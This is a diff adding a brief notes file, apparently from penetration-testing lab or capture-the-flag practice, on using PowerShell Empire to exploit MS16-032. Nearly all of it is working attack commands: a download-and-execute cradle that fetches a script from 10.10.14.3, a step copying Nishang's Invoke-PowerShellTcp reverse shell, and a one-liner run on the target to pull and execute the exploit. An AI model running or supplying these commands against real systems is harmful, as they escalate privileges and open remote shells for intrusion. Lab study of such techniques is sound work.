@@ -1,0 +1,17 @@
+In using PowerShell EMPIRE:
+
+
+Preforming an Exploit
+
+# Modify the Script to run the exact powershell script you chose.  For Ex:
+vi Invoke-MS16-032.ps1
+# At bottom of Script type:
+Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.3/shell.ps1')"
+
+# At Host VM type:
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
+
+# On the Target 
+powershell -noninteractive IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Invoke-MS16032.ps1')
+
+
